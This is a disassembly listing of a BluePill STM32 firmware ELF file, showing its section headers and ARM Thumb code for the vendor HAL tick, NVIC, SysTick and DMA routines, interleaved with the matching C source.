
BluePill.elf:     file format elf32-littlearm

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .isr_vector   0000010c  08000000  08000000  00010000  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  1 .text         000021c0  0800010c  0800010c  0001010c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  2 .rodata       000001f8  080022cc  080022cc  000122cc  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  3 .init_array   00000004  080024c4  080024c4  000124c4  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  4 .fini_array   00000004  080024c8  080024c8  000124c8  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  5 .data         000018d4  20000000  080024cc  00020000  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  6 .bss          000001c4  200018d4  08003da0  000218d4  2**2
                  ALLOC
  7 ._user_heap_stack 00000600  20001a98  08003da0  00021a98  2**0
                  ALLOC
  8 .ARM.attributes 00000029  00000000  00000000  000218d4  2**0
                  CONTENTS, READONLY
  9 .debug_info   0000cfe7  00000000  00000000  000218fd  2**0
                  CONTENTS, READONLY, DEBUGGING
 10 .debug_abbrev 00001f6f  00000000  00000000  0002e8e4  2**0
                  CONTENTS, READONLY, DEBUGGING
 11 .debug_loc    00002dd2  00000000  00000000  00030853  2**0
                  CONTENTS, READONLY, DEBUGGING
 12 .debug_aranges 00000628  00000000  00000000  00033628  2**3
                  CONTENTS, READONLY, DEBUGGING
 13 .debug_ranges 00000878  00000000  00000000  00033c50  2**3
                  CONTENTS, READONLY, DEBUGGING
 14 .debug_line   00003977  00000000  00000000  000344c8  2**0
                  CONTENTS, READONLY, DEBUGGING
 15 .debug_str    000023da  00000000  00000000  00037e3f  2**0
                  CONTENTS, READONLY, DEBUGGING
 16 .comment      0000007c  00000000  00000000  0003a219  2**0
                  CONTENTS, READONLY
 17 .debug_frame  0000134c  00000000  00000000  0003a298  2**2
                  CONTENTS, READONLY, DEBUGGING

Disassembly of section .text:

0800010c <__do_global_dtors_aux>:
 800010c:	b510      	push	{r4, lr}
 800010e:	4c05      	ldr	r4, [pc, #20]	; (8000124 <__do_global_dtors_aux+0x18>)
 8000110:	7823      	ldrb	r3, [r4, #0]
 8000112:	b933      	cbnz	r3, 8000122 <__do_global_dtors_aux+0x16>
 8000114:	4b04      	ldr	r3, [pc, #16]	; (8000128 <__do_global_dtors_aux+0x1c>)
 8000116:	b113      	cbz	r3, 800011e <__do_global_dtors_aux+0x12>
 8000118:	4804      	ldr	r0, [pc, #16]	; (800012c <__do_global_dtors_aux+0x20>)
 800011a:	f3af 8000 	nop.w
 800011e:	2301      	movs	r3, #1
 8000120:	7023      	strb	r3, [r4, #0]
 8000122:	bd10      	pop	{r4, pc}
 8000124:	200018d4 	.word	0x200018d4
 8000128:	00000000 	.word	0x00000000
 800012c:	080022b4 	.word	0x080022b4

08000130 <frame_dummy>:
 8000130:	b508      	push	{r3, lr}
 8000132:	4b03      	ldr	r3, [pc, #12]	; (8000140 <frame_dummy+0x10>)
 8000134:	b11b      	cbz	r3, 800013e <frame_dummy+0xe>
 8000136:	4903      	ldr	r1, [pc, #12]	; (8000144 <frame_dummy+0x14>)
 8000138:	4803      	ldr	r0, [pc, #12]	; (8000148 <frame_dummy+0x18>)
 800013a:	f3af 8000 	nop.w
 800013e:	bd08      	pop	{r3, pc}
 8000140:	00000000 	.word	0x00000000
 8000144:	200018d8 	.word	0x200018d8
 8000148:	080022b4 	.word	0x080022b4

0800014c <HAL_InitTick>:
  *       implementation  in user file.
  * @param TickPriority Tick interrupt priority.
  * @retval HAL status
  */
__weak HAL_StatusTypeDef HAL_InitTick(uint32_t TickPriority)
{
 800014c:	b538      	push	{r3, r4, r5, lr}
  /* Configure the SysTick to have interrupt in 1ms time basis*/
  if (HAL_SYSTICK_Config(SystemCoreClock / (1000U / uwTickFreq)) > 0U)
 800014e:	4b0e      	ldr	r3, [pc, #56]	; (8000188 <HAL_InitTick+0x3c>)
{
 8000150:	4605      	mov	r5, r0
  if (HAL_SYSTICK_Config(SystemCoreClock / (1000U / uwTickFreq)) > 0U)
 8000152:	7818      	ldrb	r0, [r3, #0]
 8000154:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 8000158:	fbb3 f3f0 	udiv	r3, r3, r0
 800015c:	4a0b      	ldr	r2, [pc, #44]	; (800018c <HAL_InitTick+0x40>)
 800015e:	6810      	ldr	r0, [r2, #0]
 8000160:	fbb0 f0f3 	udiv	r0, r0, r3
 8000164:	f000 f89e 	bl	80002a4 <HAL_SYSTICK_Config>
 8000168:	4604      	mov	r4, r0
 800016a:	b958      	cbnz	r0, 8000184 <HAL_InitTick+0x38>
  {
    return HAL_ERROR;
  }

  /* Configure the SysTick IRQ priority */
  if (TickPriority < (1UL << __NVIC_PRIO_BITS))
 800016c:	2d0f      	cmp	r5, #15
 800016e:	d809      	bhi.n	8000184 <HAL_InitTick+0x38>
  {
    HAL_NVIC_SetPriority(SysTick_IRQn, TickPriority, 0U);
 8000170:	4602      	mov	r2, r0
 8000172:	4629      	mov	r1, r5
 8000174:	f04f 30ff 	mov.w	r0, #4294967295
 8000178:	f000 f854 	bl	8000224 <HAL_NVIC_SetPriority>
    uwTickPrio = TickPriority;
 800017c:	4b04      	ldr	r3, [pc, #16]	; (8000190 <HAL_InitTick+0x44>)
 800017e:	4620      	mov	r0, r4
 8000180:	601d      	str	r5, [r3, #0]
 8000182:	bd38      	pop	{r3, r4, r5, pc}
    return HAL_ERROR;
 8000184:	2001      	movs	r0, #1
    return HAL_ERROR;
  }

  /* Return function status */
  return HAL_OK;
}
 8000186:	bd38      	pop	{r3, r4, r5, pc}
 8000188:	20000000 	.word	0x20000000
 800018c:	2000186c 	.word	0x2000186c
 8000190:	20000004 	.word	0x20000004

08000194 <HAL_Init>:
  __HAL_FLASH_PREFETCH_BUFFER_ENABLE();
 8000194:	4a07      	ldr	r2, [pc, #28]	; (80001b4 <HAL_Init+0x20>)
{
 8000196:	b508      	push	{r3, lr}
  __HAL_FLASH_PREFETCH_BUFFER_ENABLE();
 8000198:	6813      	ldr	r3, [r2, #0]
  HAL_NVIC_SetPriorityGrouping(NVIC_PRIORITYGROUP_4);
 800019a:	2003      	movs	r0, #3
  __HAL_FLASH_PREFETCH_BUFFER_ENABLE();
 800019c:	f043 0310 	orr.w	r3, r3, #16
 80001a0:	6013      	str	r3, [r2, #0]
  HAL_NVIC_SetPriorityGrouping(NVIC_PRIORITYGROUP_4);
 80001a2:	f000 f82d 	bl	8000200 <HAL_NVIC_SetPriorityGrouping>
  HAL_InitTick(TICK_INT_PRIORITY);
 80001a6:	2000      	movs	r0, #0
 80001a8:	f7ff ffd0 	bl	800014c <HAL_InitTick>
  HAL_MspInit();
 80001ac:	f001 fae2 	bl	8001774 <HAL_MspInit>
}
 80001b0:	2000      	movs	r0, #0
 80001b2:	bd08      	pop	{r3, pc}
 80001b4:	40022000 	.word	0x40022000

080001b8 <HAL_IncTick>:
  *      implementations in user file.
  * @retval None
  */
__weak void HAL_IncTick(void)
{
  uwTick += uwTickFreq;
 80001b8:	4a03      	ldr	r2, [pc, #12]	; (80001c8 <HAL_IncTick+0x10>)
 80001ba:	4b04      	ldr	r3, [pc, #16]	; (80001cc <HAL_IncTick+0x14>)
 80001bc:	6811      	ldr	r1, [r2, #0]
 80001be:	781b      	ldrb	r3, [r3, #0]
 80001c0:	440b      	add	r3, r1
 80001c2:	6013      	str	r3, [r2, #0]
 80001c4:	4770      	bx	lr
 80001c6:	bf00      	nop
 80001c8:	200018fc 	.word	0x200018fc
 80001cc:	20000000 	.word	0x20000000

080001d0 <HAL_GetTick>:
  *       implementations in user file.
  * @retval tick value
  */
__weak uint32_t HAL_GetTick(void)
{
  return uwTick;
 80001d0:	4b01      	ldr	r3, [pc, #4]	; (80001d8 <HAL_GetTick+0x8>)
 80001d2:	6818      	ldr	r0, [r3, #0]
}
 80001d4:	4770      	bx	lr
 80001d6:	bf00      	nop
 80001d8:	200018fc 	.word	0x200018fc

080001dc <HAL_Delay>:
  *       implementations in user file.
  * @param Delay specifies the delay time length, in milliseconds.
  * @retval None
  */
__weak void HAL_Delay(uint32_t Delay)
{
 80001dc:	b538      	push	{r3, r4, r5, lr}
 80001de:	4604      	mov	r4, r0
  uint32_t tickstart = HAL_GetTick();
 80001e0:	f7ff fff6 	bl	80001d0 <HAL_GetTick>
 80001e4:	4605      	mov	r5, r0
  uint32_t wait = Delay;

  /* Add a freq to guarantee minimum wait */
  if (wait < HAL_MAX_DELAY)
 80001e6:	1c63      	adds	r3, r4, #1
  {
    wait += (uint32_t)(uwTickFreq);
 80001e8:	bf1e      	ittt	ne
 80001ea:	4b04      	ldrne	r3, [pc, #16]	; (80001fc <HAL_Delay+0x20>)
 80001ec:	781b      	ldrbne	r3, [r3, #0]
 80001ee:	18e4      	addne	r4, r4, r3
  }

  while ((HAL_GetTick() - tickstart) < wait)
 80001f0:	f7ff ffee 	bl	80001d0 <HAL_GetTick>
 80001f4:	1b40      	subs	r0, r0, r5
 80001f6:	4284      	cmp	r4, r0
 80001f8:	d8fa      	bhi.n	80001f0 <HAL_Delay+0x14>
  {
  }
}
 80001fa:	bd38      	pop	{r3, r4, r5, pc}
 80001fc:	20000000 	.word	0x20000000

08000200 <HAL_NVIC_SetPriorityGrouping>:
__STATIC_INLINE void NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
  uint32_t reg_value;
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);             /* only values 0..7 are used          */

  reg_value  =  SCB->AIRCR;                                                   /* read old register configuration    */
 8000200:	4a07      	ldr	r2, [pc, #28]	; (8000220 <HAL_NVIC_SetPriorityGrouping+0x20>)
  reg_value &= ~((uint32_t)(SCB_AIRCR_VECTKEY_Msk | SCB_AIRCR_PRIGROUP_Msk)); /* clear bits to change               */
  reg_value  =  (reg_value                                   |
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
                (PriorityGroupTmp << 8U)                      );              /* Insert write key and priorty group */
 8000202:	0200      	lsls	r0, r0, #8
  reg_value  =  SCB->AIRCR;                                                   /* read old register configuration    */
 8000204:	68d3      	ldr	r3, [r2, #12]
                (PriorityGroupTmp << 8U)                      );              /* Insert write key and priorty group */
 8000206:	f400 60e0 	and.w	r0, r0, #1792	; 0x700
  reg_value &= ~((uint32_t)(SCB_AIRCR_VECTKEY_Msk | SCB_AIRCR_PRIGROUP_Msk)); /* clear bits to change               */
 800020a:	f423 63e0 	bic.w	r3, r3, #1792	; 0x700
 800020e:	041b      	lsls	r3, r3, #16
 8000210:	0c1b      	lsrs	r3, r3, #16
 8000212:	f043 63bf 	orr.w	r3, r3, #100139008	; 0x5f80000
 8000216:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
  reg_value  =  (reg_value                                   |
 800021a:	4303      	orrs	r3, r0
  SCB->AIRCR =  reg_value;
 800021c:	60d3      	str	r3, [r2, #12]
 800021e:	4770      	bx	lr
 8000220:	e000ed00 	.word	0xe000ed00

08000224 <HAL_NVIC_SetPriority>:
  \details Reads the priority grouping field from the NVIC Interrupt Controller.
  \return                Priority grouping field (SCB->AIRCR [10:8] PRIGROUP field).
 */
__STATIC_INLINE uint32_t NVIC_GetPriorityGrouping(void)
{
  return ((uint32_t)((SCB->AIRCR & SCB_AIRCR_PRIGROUP_Msk) >> SCB_AIRCR_PRIGROUP_Pos));
 8000224:	4b17      	ldr	r3, [pc, #92]	; (8000284 <HAL_NVIC_SetPriority+0x60>)
  *         This parameter can be a value between 0 and 15
  *         A lower priority value indicates a higher priority.          
  * @retval None
  */
void HAL_NVIC_SetPriority(IRQn_Type IRQn, uint32_t PreemptPriority, uint32_t SubPriority)
{ 
 8000226:	b530      	push	{r4, r5, lr}
 8000228:	68dc      	ldr	r4, [r3, #12]
 800022a:	f3c4 2402 	ubfx	r4, r4, #8, #3
{
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);   /* only values 0..7 are used          */
  uint32_t PreemptPriorityBits;
  uint32_t SubPriorityBits;

  PreemptPriorityBits = ((7UL - PriorityGroupTmp) > (uint32_t)(__NVIC_PRIO_BITS)) ? (uint32_t)(__NVIC_PRIO_BITS) : (uint32_t)(7UL - PriorityGroupTmp);
 800022e:	f1c4 0307 	rsb	r3, r4, #7
  SubPriorityBits     = ((PriorityGroupTmp + (uint32_t)(__NVIC_PRIO_BITS)) < (uint32_t)7UL) ? (uint32_t)0UL : (uint32_t)((PriorityGroupTmp - 7UL) + (uint32_t)(__NVIC_PRIO_BITS));
 8000232:	1d25      	adds	r5, r4, #4
  PreemptPriorityBits = ((7UL - PriorityGroupTmp) > (uint32_t)(__NVIC_PRIO_BITS)) ? (uint32_t)(__NVIC_PRIO_BITS) : (uint32_t)(7UL - PriorityGroupTmp);
 8000234:	2b04      	cmp	r3, #4
 8000236:	bf28      	it	cs
 8000238:	2304      	movcs	r3, #4
  SubPriorityBits     = ((PriorityGroupTmp + (uint32_t)(__NVIC_PRIO_BITS)) < (uint32_t)7UL) ? (uint32_t)0UL : (uint32_t)((PriorityGroupTmp - 7UL) + (uint32_t)(__NVIC_PRIO_BITS));
 800023a:	2d06      	cmp	r5, #6

  return (
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 800023c:	f04f 0501 	mov.w	r5, #1
  SubPriorityBits     = ((PriorityGroupTmp + (uint32_t)(__NVIC_PRIO_BITS)) < (uint32_t)7UL) ? (uint32_t)0UL : (uint32_t)((PriorityGroupTmp - 7UL) + (uint32_t)(__NVIC_PRIO_BITS));
 8000240:	bf98      	it	ls
 8000242:	2400      	movls	r4, #0
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 8000244:	fa05 f303 	lsl.w	r3, r5, r3
 8000248:	f103 33ff 	add.w	r3, r3, #4294967295
  SubPriorityBits     = ((PriorityGroupTmp + (uint32_t)(__NVIC_PRIO_BITS)) < (uint32_t)7UL) ? (uint32_t)0UL : (uint32_t)((PriorityGroupTmp - 7UL) + (uint32_t)(__NVIC_PRIO_BITS));
 800024c:	bf88      	it	hi
 800024e:	3c03      	subhi	r4, #3
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 8000250:	4019      	ands	r1, r3
 8000252:	40a1      	lsls	r1, r4
           ((SubPriority     & (uint32_t)((1UL << (SubPriorityBits    )) - 1UL)))
 8000254:	fa05 f404 	lsl.w	r4, r5, r4
 8000258:	3c01      	subs	r4, #1
 800025a:	4022      	ands	r2, r4
  if ((int32_t)(IRQn) < 0)
 800025c:	2800      	cmp	r0, #0
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 800025e:	ea42 0201 	orr.w	r2, r2, r1
 8000262:	ea4f 1202 	mov.w	r2, r2, lsl #4
    NVIC->IP[((uint32_t)(int32_t)IRQn)]               = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 8000266:	bfaf      	iteee	ge
 8000268:	f100 4060 	addge.w	r0, r0, #3758096384	; 0xe0000000
    SCB->SHP[(((uint32_t)(int32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 800026c:	4b06      	ldrlt	r3, [pc, #24]	; (8000288 <HAL_NVIC_SetPriority+0x64>)
 800026e:	f000 000f 	andlt.w	r0, r0, #15
 8000272:	b2d2      	uxtblt	r2, r2
    NVIC->IP[((uint32_t)(int32_t)IRQn)]               = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 8000274:	bfa5      	ittet	ge
 8000276:	b2d2      	uxtbge	r2, r2
 8000278:	f500 4061 	addge.w	r0, r0, #57600	; 0xe100
    SCB->SHP[(((uint32_t)(int32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 800027c:	541a      	strblt	r2, [r3, r0]
    NVIC->IP[((uint32_t)(int32_t)IRQn)]               = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 800027e:	f880 2300 	strbge.w	r2, [r0, #768]	; 0x300
 8000282:	bd30      	pop	{r4, r5, pc}
 8000284:	e000ed00 	.word	0xe000ed00
 8000288:	e000ed14 	.word	0xe000ed14

0800028c <HAL_NVIC_EnableIRQ>:
  NVIC->ISER[(((uint32_t)(int32_t)IRQn) >> 5UL)] = (uint32_t)(1UL << (((uint32_t)(int32_t)IRQn) & 0x1FUL));
 800028c:	2301      	movs	r3, #1
 800028e:	0942      	lsrs	r2, r0, #5
 8000290:	f000 001f 	and.w	r0, r0, #31
 8000294:	fa03 f000 	lsl.w	r0, r3, r0
 8000298:	4b01      	ldr	r3, [pc, #4]	; (80002a0 <HAL_NVIC_EnableIRQ+0x14>)
 800029a:	f843 0022 	str.w	r0, [r3, r2, lsl #2]
 800029e:	4770      	bx	lr
 80002a0:	e000e100 	.word	0xe000e100

080002a4 <HAL_SYSTICK_Config>:
           function <b>SysTick_Config</b> is not included. In this case, the file <b><i>device</i>.h</b>
           must contain a vendor-specific implementation of this function.
 */
__STATIC_INLINE uint32_t SysTick_Config(uint32_t ticks)
{
  if ((ticks - 1UL) > SysTick_LOAD_RELOAD_Msk)
 80002a4:	3801      	subs	r0, #1
 80002a6:	f1b0 7f80 	cmp.w	r0, #16777216	; 0x1000000
 80002aa:	d20a      	bcs.n	80002c2 <HAL_SYSTICK_Config+0x1e>
    SCB->SHP[(((uint32_t)(int32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 80002ac:	21f0      	movs	r1, #240	; 0xf0
  {
    return (1UL);                                                   /* Reload value impossible */
  }

  SysTick->LOAD  = (uint32_t)(ticks - 1UL);                         /* set reload register */
 80002ae:	4b06      	ldr	r3, [pc, #24]	; (80002c8 <HAL_SYSTICK_Config+0x24>)
    SCB->SHP[(((uint32_t)(int32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 80002b0:	4a06      	ldr	r2, [pc, #24]	; (80002cc <HAL_SYSTICK_Config+0x28>)
  SysTick->LOAD  = (uint32_t)(ticks - 1UL);                         /* set reload register */
 80002b2:	6058      	str	r0, [r3, #4]
    SCB->SHP[(((uint32_t)(int32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 80002b4:	f882 1023 	strb.w	r1, [r2, #35]	; 0x23
  NVIC_SetPriority (SysTick_IRQn, (1UL << __NVIC_PRIO_BITS) - 1UL); /* set Priority for Systick Interrupt */
  SysTick->VAL   = 0UL;                                             /* Load the SysTick Counter Value */
 80002b8:	2000      	movs	r0, #0
  SysTick->CTRL  = SysTick_CTRL_CLKSOURCE_Msk |
 80002ba:	2207      	movs	r2, #7
  SysTick->VAL   = 0UL;                                             /* Load the SysTick Counter Value */
 80002bc:	6098      	str	r0, [r3, #8]
  SysTick->CTRL  = SysTick_CTRL_CLKSOURCE_Msk |
 80002be:	601a      	str	r2, [r3, #0]
 80002c0:	4770      	bx	lr
    return (1UL);                                                   /* Reload value impossible */
 80002c2:	2001      	movs	r0, #1
  *                  - 1  Function failed.
  */
uint32_t HAL_SYSTICK_Config(uint32_t TicksNumb)
{
   return SysTick_Config(TicksNumb);
}
 80002c4:	4770      	bx	lr
 80002c6:	bf00      	nop
 80002c8:	e000e010 	.word	0xe000e010
 80002cc:	e000ed00 	.word	0xe000ed00

080002d0 <HAL_DMA_Init>:
  * @param  hdma: Pointer to a DMA_HandleTypeDef structure that contains
  *               the configuration information for the specified DMA Channel.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_DMA_Init(DMA_HandleTypeDef *hdma)
{
 80002d0:	b510      	push	{r4, lr}
  uint32_t tmp = 0U;

  /* Check the DMA handle allocation */
  if(hdma == NULL)
 80002d2:	b330      	cbz	r0, 8000322 <HAL_DMA_Init+0x52>
    hdma->ChannelIndex = (((uint32_t)hdma->Instance - (uint32_t)DMA2_Channel1) / ((uint32_t)DMA2_Channel2 - (uint32_t)DMA2_Channel1)) << 2;
    hdma->DmaBaseAddress = DMA2;
  }
#else
  /* DMA1 */
  hdma->ChannelIndex = (((uint32_t)hdma->Instance - (uint32_t)DMA1_Channel1) / ((uint32_t)DMA1_Channel2 - (uint32_t)DMA1_Channel1)) << 2;
 80002d4:	2214      	movs	r2, #20
 80002d6:	6801      	ldr	r1, [r0, #0]
 80002d8:	4b13      	ldr	r3, [pc, #76]	; (8000328 <HAL_DMA_Init+0x58>)
  tmp &= ((uint32_t)~(DMA_CCR_PL    | DMA_CCR_MSIZE  | DMA_CCR_PSIZE  | \
                      DMA_CCR_MINC  | DMA_CCR_PINC   | DMA_CCR_CIRC   | \
                      DMA_CCR_DIR));

  /* Prepare the DMA Channel configuration */
  tmp |=  hdma->Init.Direction        |
 80002da:	6884      	ldr	r4, [r0, #8]
  hdma->ChannelIndex = (((uint32_t)hdma->Instance - (uint32_t)DMA1_Channel1) / ((uint32_t)DMA1_Channel2 - (uint32_t)DMA1_Channel1)) << 2;
 80002dc:	440b      	add	r3, r1
 80002de:	fbb3 f3f2 	udiv	r3, r3, r2
 80002e2:	009b      	lsls	r3, r3, #2
 80002e4:	6403      	str	r3, [r0, #64]	; 0x40
  hdma->DmaBaseAddress = DMA1;
 80002e6:	4b11      	ldr	r3, [pc, #68]	; (800032c <HAL_DMA_Init+0x5c>)
  tmp = hdma->Instance->CCR;
 80002e8:	680a      	ldr	r2, [r1, #0]
  hdma->DmaBaseAddress = DMA1;
 80002ea:	63c3      	str	r3, [r0, #60]	; 0x3c
  tmp |=  hdma->Init.Direction        |
 80002ec:	6843      	ldr	r3, [r0, #4]
  tmp &= ((uint32_t)~(DMA_CCR_PL    | DMA_CCR_MSIZE  | DMA_CCR_PSIZE  | \
 80002ee:	f422 527f 	bic.w	r2, r2, #16320	; 0x3fc0
  tmp |=  hdma->Init.Direction        |
 80002f2:	4323      	orrs	r3, r4
          hdma->Init.PeriphInc           | hdma->Init.MemInc           |
 80002f4:	68c4      	ldr	r4, [r0, #12]
  tmp &= ((uint32_t)~(DMA_CCR_PL    | DMA_CCR_MSIZE  | DMA_CCR_PSIZE  | \
 80002f6:	f022 0230 	bic.w	r2, r2, #48	; 0x30
          hdma->Init.PeriphInc           | hdma->Init.MemInc           |
 80002fa:	4323      	orrs	r3, r4
 80002fc:	6904      	ldr	r4, [r0, #16]
 80002fe:	4323      	orrs	r3, r4
          hdma->Init.PeriphDataAlignment | hdma->Init.MemDataAlignment |
 8000300:	6944      	ldr	r4, [r0, #20]
 8000302:	4323      	orrs	r3, r4
 8000304:	6984      	ldr	r4, [r0, #24]
 8000306:	4323      	orrs	r3, r4
          hdma->Init.Mode                | hdma->Init.Priority;
 8000308:	69c4      	ldr	r4, [r0, #28]
 800030a:	4323      	orrs	r3, r4
  tmp |=  hdma->Init.Direction        |
 800030c:	4313      	orrs	r3, r2

  /* Write to DMA Channel CR register */
  hdma->Instance->CCR = tmp;
 800030e:	600b      	str	r3, [r1, #0]

  /* Initialise the error code */
  hdma->ErrorCode = HAL_DMA_ERROR_NONE;

  /* Initialize the DMA state*/
  hdma->State = HAL_DMA_STATE_READY;
 8000310:	2201      	movs	r2, #1
  hdma->ErrorCode = HAL_DMA_ERROR_NONE;
 8000312:	2300      	movs	r3, #0
  hdma->State = HAL_DMA_STATE_READY;
 8000314:	f880 2021 	strb.w	r2, [r0, #33]	; 0x21
  hdma->ErrorCode = HAL_DMA_ERROR_NONE;
 8000318:	6383      	str	r3, [r0, #56]	; 0x38
  /* Allocate lock resource and initialize it */
  hdma->Lock = HAL_UNLOCKED;
 800031a:	f880 3020 	strb.w	r3, [r0, #32]

  return HAL_OK;
 800031e:	4618      	mov	r0, r3
 8000320:	bd10      	pop	{r4, pc}
    return HAL_ERROR;
 8000322:	2001      	movs	r0, #1
}
 8000324:	bd10      	pop	{r4, pc}
 8000326:	bf00      	nop
 8000328:	bffdfff8 	.word	0xbffdfff8
 800032c:	40020000 	.word	0x40020000

08000330 <HAL_DMA_Start_IT>:
  * @param  DstAddress: The destination memory Buffer address
  * @param  DataLength: The length of data to be transferred from source to destination
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_DMA_Start_IT(DMA_HandleTypeDef *hdma, uint32_t SrcAddress, uint32_t DstAddress, uint32_t DataLength)
{
 8000330:	b5f0      	push	{r4, r5, r6, r7, lr}

  /* Check the parameters */
  assert_param(IS_DMA_BUFFER_SIZE(DataLength));

  /* Process locked */
  __HAL_LOCK(hdma);
 8000332:	f890 4020 	ldrb.w	r4, [r0, #32]
 8000336:	2c01      	cmp	r4, #1
 8000338:	d035      	beq.n	80003a6 <HAL_DMA_Start_IT+0x76>
 800033a:	2401      	movs	r4, #1
  
  if(HAL_DMA_STATE_READY == hdma->State)
 800033c:	f890 5021 	ldrb.w	r5, [r0, #33]	; 0x21
  __HAL_LOCK(hdma);
 8000340:	f880 4020 	strb.w	r4, [r0, #32]
  if(HAL_DMA_STATE_READY == hdma->State)
 8000344:	42a5      	cmp	r5, r4
 8000346:	f04f 0600 	mov.w	r6, #0
 800034a:	f04f 0402 	mov.w	r4, #2
 800034e:	d128      	bne.n	80003a2 <HAL_DMA_Start_IT+0x72>
  {
    /* Change DMA peripheral state */
    hdma->State = HAL_DMA_STATE_BUSY;
 8000350:	f880 4021 	strb.w	r4, [r0, #33]	; 0x21
    hdma->ErrorCode = HAL_DMA_ERROR_NONE;
    
    /* Disable the peripheral */
    __HAL_DMA_DISABLE(hdma);
 8000354:	6804      	ldr	r4, [r0, #0]
    hdma->ErrorCode = HAL_DMA_ERROR_NONE;
 8000356:	6386      	str	r6, [r0, #56]	; 0x38
    __HAL_DMA_DISABLE(hdma);
 8000358:	6826      	ldr	r6, [r4, #0]
  * @retval HAL status
  */
static void DMA_SetConfig(DMA_HandleTypeDef *hdma, uint32_t SrcAddress, uint32_t DstAddress, uint32_t DataLength)
{
  /* Clear all flags */
  hdma->DmaBaseAddress->IFCR = (DMA_ISR_GIF1 << hdma->ChannelIndex);
 800035a:	6c07      	ldr	r7, [r0, #64]	; 0x40
    __HAL_DMA_DISABLE(hdma);
 800035c:	f026 0601 	bic.w	r6, r6, #1
 8000360:	6026      	str	r6, [r4, #0]
  hdma->DmaBaseAddress->IFCR = (DMA_ISR_GIF1 << hdma->ChannelIndex);
 8000362:	6bc6      	ldr	r6, [r0, #60]	; 0x3c
 8000364:	40bd      	lsls	r5, r7
 8000366:	6075      	str	r5, [r6, #4]

  /* Configure DMA Channel data length */
  hdma->Instance->CNDTR = DataLength;
 8000368:	6063      	str	r3, [r4, #4]

  /* Memory to Peripheral */
  if((hdma->Init.Direction) == DMA_MEMORY_TO_PERIPH)
 800036a:	6843      	ldr	r3, [r0, #4]
 800036c:	6805      	ldr	r5, [r0, #0]
 800036e:	2b10      	cmp	r3, #16
    if(NULL != hdma->XferHalfCpltCallback)
 8000370:	6ac3      	ldr	r3, [r0, #44]	; 0x2c
  {
    /* Configure DMA Channel destination address */
    hdma->Instance->CPAR = DstAddress;
 8000372:	bf0b      	itete	eq
 8000374:	60a2      	streq	r2, [r4, #8]
  }
  /* Peripheral to Memory */
  else
  {
    /* Configure DMA Channel source address */
    hdma->Instance->CPAR = SrcAddress;
 8000376:	60a1      	strne	r1, [r4, #8]
    hdma->Instance->CMAR = SrcAddress;
 8000378:	60e1      	streq	r1, [r4, #12]

    /* Configure DMA Channel destination address */
    hdma->Instance->CMAR = DstAddress;
 800037a:	60e2      	strne	r2, [r4, #12]
    if(NULL != hdma->XferHalfCpltCallback)
 800037c:	b14b      	cbz	r3, 8000392 <HAL_DMA_Start_IT+0x62>
      __HAL_DMA_ENABLE_IT(hdma, (DMA_IT_TC | DMA_IT_HT | DMA_IT_TE));
 800037e:	6823      	ldr	r3, [r4, #0]
 8000380:	f043 030e 	orr.w	r3, r3, #14
      __HAL_DMA_ENABLE_IT(hdma, (DMA_IT_TC | DMA_IT_TE));
 8000384:	6023      	str	r3, [r4, #0]
    __HAL_DMA_ENABLE(hdma);
 8000386:	682b      	ldr	r3, [r5, #0]
  HAL_StatusTypeDef status = HAL_OK;
 8000388:	2000      	movs	r0, #0
    __HAL_DMA_ENABLE(hdma);
 800038a:	f043 0301 	orr.w	r3, r3, #1
 800038e:	602b      	str	r3, [r5, #0]
 8000390:	bdf0      	pop	{r4, r5, r6, r7, pc}
      __HAL_DMA_DISABLE_IT(hdma, DMA_IT_HT);
 8000392:	6823      	ldr	r3, [r4, #0]
 8000394:	f023 0304 	bic.w	r3, r3, #4
 8000398:	6023      	str	r3, [r4, #0]
      __HAL_DMA_ENABLE_IT(hdma, (DMA_IT_TC | DMA_IT_TE));
 800039a:	6823      	ldr	r3, [r4, #0]
 800039c:	f043 030a 	orr.w	r3, r3, #10
 80003a0:	e7f0      	b.n	8000384 <HAL_DMA_Start_IT+0x54>
    __HAL_UNLOCK(hdma); 
 80003a2:	f880 6020 	strb.w	r6, [r0, #32]
  __HAL_LOCK(hdma);
 80003a6:	2002      	movs	r0, #2
}
 80003a8:	bdf0      	pop	{r4, r5, r6, r7, pc}
	...

080003ac <HAL_DMA_Abort_IT>:
  if(HAL_DMA_STATE_BUSY != hdma->State)
 80003ac:	f890 3021 	ldrb.w	r3, [r0, #33]	; 0x21
{  
